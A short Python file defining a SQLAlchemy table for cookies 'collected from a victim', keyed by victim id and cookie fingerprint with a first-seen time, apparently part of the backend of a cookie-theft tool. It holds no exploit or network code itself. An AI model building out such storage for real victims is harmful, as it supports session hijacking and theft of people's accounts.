"""Persistent identities for cookies already collected from a victim."""

from sqlalchemy import Column, ForeignKey, String

from database import Base
from models.types import UTCDateTime, utc_now


class CapturedCookie(Base):
    __tablename__ = "captured_cookies"

    victim_id = Column(
        String,
        ForeignKey("victims.id", ondelete="CASCADE"),
        primary_key=True,
    )
    fingerprint = Column(String(64), primary_key=True)
    first_seen_at = Column(
        UTCDateTime(),
        default=utc_now,
        nullable=False,
    )
